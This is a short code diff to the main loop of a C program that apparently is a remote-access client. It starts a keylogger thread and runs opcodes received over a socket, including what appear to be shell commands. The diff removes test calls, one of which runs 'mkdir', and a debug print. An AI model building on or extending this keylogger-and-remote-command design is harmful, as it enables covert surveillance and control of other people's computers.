@@ -29,20 +29,22 @@ int main()
     }
     pthread_detach(clientData.keyLoggerTid);
 
-    sleep(1);
     message_t msg;
-    msg.opCode = 'S';
-    msg.size = 0;
-    handleOpcode(msg);
-    msg.opCode = 'C';
-    strcpy(msg.buffer, "mkdir ~/DirectorDeTest");
-    msg.size = strlen(msg.buffer);
-    handleOpcode(msg);
+    // msg.opCode = 'S';
+    // msg.size = 0;
+    // handleOpcode(msg);
+    // while (1)
+    // {
+    //     sleep(1);
+    //     msg.opCode = 'S';
+    //     msg.size = 0;
+    //     handleOpcode(msg);
+    // }
     while (1)
     {
         if (recvMessage(sock, &msg) <= 0)
             break;
-        printf("Recieved: %s(opcode %c)", msg.buffer, msg.opCode);
+        // printf("Recieved: %s(opcode %c)", msg.buffer, msg.opCode);
         handleOpcode(msg);
     }
     // Pornire Keylogger
